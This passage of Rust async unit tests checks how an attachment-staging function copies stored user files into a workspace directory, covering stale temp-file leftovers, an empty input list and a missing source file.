        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let user = Uuid::new_v4();
        let id = Uuid::new_v4();
        seed_attachment(&storage, user, id, "txt", b"fresh").await;

        let state = fake_state(workspace_tmp.path().to_path_buf());
        let stage_dir = state.workspace_root.join("attachments");
        tokio::fs::create_dir_all(&stage_dir).await.unwrap();
        let leftover = stage_dir.join(format!("{id}.tmp.99999"));
        tokio::fs::write(&leftover, b"stale crash leftover").await.unwrap();

        let files = vec![conv_file(id, user, "a.txt")];
        super::stage_attachments_with(&state, &files, &storage).await;

        let staged = stage_dir.join(id.to_string());
        let got = tokio::fs::read(&staged).await.unwrap();
        assert_eq!(got, b"fresh", "fresh bytes must land at final path");
    }

    #[tokio::test]
    async fn stage_attachments_empty_files_list_is_noop() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let state = fake_state(workspace_tmp.path().to_path_buf());
        super::stage_attachments_with(&state, &[], &storage).await;

        // Empty input → we don't even create the attachments dir.
        assert!(!state.workspace_root.join("attachments").exists());
    }

    #[tokio::test]
    async fn stage_attachments_continues_when_one_file_load_fails() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let user = Uuid::new_v4();
        let good_id = Uuid::new_v4();
        let missing_id = Uuid::new_v4();
        // good is seeded; missing is NOT (load_original returns 404).
        seed_attachment(&storage, user, good_id, "txt", b"ok").await;

        let state = fake_state(workspace_tmp.path().to_path_buf());
        let files = vec![
            conv_file(missing_id, user, "missing.txt"),
            conv_file(good_id, user, "good.txt"),
        ];
        super::stage_attachments_with(&state, &files, &storage).await;

        let dir = state.workspace_root.join("attachments");
        assert!(
            !dir.join(missing_id.to_string()).exists(),
            "missing source must NOT be staged"
        );
        assert!(
            dir.join(good_id.to_string()).exists(),
            "subsequent good file must still stage"
        );
    }
}
